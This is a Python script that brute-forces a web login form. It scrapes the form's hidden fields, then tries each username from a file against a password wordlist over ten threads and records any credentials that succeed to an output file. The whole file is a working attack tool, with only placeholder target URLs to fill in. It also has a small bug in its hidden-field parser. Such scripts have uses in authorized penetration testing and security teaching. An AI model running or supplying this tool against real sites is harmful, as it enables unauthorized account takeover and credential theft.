#!/usr/local/bin/python3
import threading
import queue
from html.parser import HTMLParser
import requests

### refer to README.md for usage and explanations

user_thread = 10
username_file = "username_file.txt"
wordlist_file = "passwords.txt"
output_file = "output.txt"
resume = None
target_url = "<url_to_target>"
target_post = "<url_to_target_post>"
username_field = "username"
password_field = "password"
error_check = "Wrong username and password" # change to appropriate text

output = open(output_file, 'w')

def copy_of_queue(old_queue):
	new_queue = queue.Queue()
	for i in old_queue.queue:
		new_queue.put(i)

	return new_queue

def build_wordlist(wordlist_file):
	# read in the word list
	fd = open(wordlist_file,"r")
	raw_words = fd.readlines()
	fd.close()

	found_resume = False
	words = queue.Queue()

	for word in raw_words:
		word = word.rstrip()

		if resume is not None:
			if found_resume:
				words.put(word)
			else:
				if word == resume:
					found_resume = True
					print("Resuming wordlist from: %s" % resume)
		else:
			words.put(word)

	return words

class BruteParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tag_results = {}

	def handle_starttag(self, tag, attrs):
		if tag == "input":
			tag_name = None
			tag_value = None
			for name, value in attrs:
				if name == "name":
					tag_name = value
				if name == "value":
					tag_value = value

			if tag_name is not None:
				self.tag_results[tag_name] = value 

class Bruter(object):
	def __init__(self, username, words):
		self.username = username
		self.password_q = words
		self.found = False

		print("Finished setting up for: %s" % username)

	def run_bruteforce(self):
		ret = [threading.Thread(target=self.web_bruter) for _ in range(user_thread)]
		for t in ret: t.start()

		return ret

	def web_bruter(self):
		while not self.password_q.empty() and not self.found:
			brute = self.password_q.get().rstrip()
			response = requests.get(target_url)

			with requests.Session() as session:
				response = session.get(target_url)

				page = response.text
				print("Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize()))
				# parse out the hidden fields
				parser = BruteParser()
				parser.feed(page)
				post_tags = parser.tag_results
				
				# add our username and password fields
				post_tags[username_field] = self.username
				post_tags[password_field] = brute

				session.headers.update({'referer': target_url})
				
				login_response = session.post(target_post, data=post_tags)

				login_result = login_response.text

				if error_check not in login_result:
					self.found = True
					wr = self.username + ':' + brute + '\n'
					output.write(wr)
					print("FOUND %s" % brute)

words = build_wordlist(wordlist_file)
with open(username_file) as f:
	for username in f:
		bruter = Bruter(username.strip(" \n"), copy_of_queue(words))
		threads = bruter.run_bruteforce()
		for t in threads: t.join() # join all threads

output.close()